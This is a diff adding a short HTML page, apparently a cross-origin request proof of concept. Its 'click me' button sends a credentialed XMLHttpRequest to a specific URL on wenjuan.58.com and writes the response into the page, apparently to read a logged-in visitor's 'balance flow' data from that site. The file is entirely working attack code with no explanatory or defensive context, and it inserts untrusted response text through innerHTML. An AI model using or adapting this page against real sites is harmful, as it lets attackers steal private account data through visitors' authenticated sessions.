@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<body>
+<div id="demo">
+<h1> get balanceflow </h1>
+<button type="button" onclick="loadDoc()">click me</button>
+</div>
+<script>
+function loadDoc() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("demo").innerHTML =
+      this.responseText;
+    }
+  };
+  xhttp.withCredentials=true;
+  xhttp.open("GET","https://wenjuan.58.com/s/?id=1029814&hash=dh5u",true)
+  xhttp.send();
+}
+</script>
+</body>
+</html>
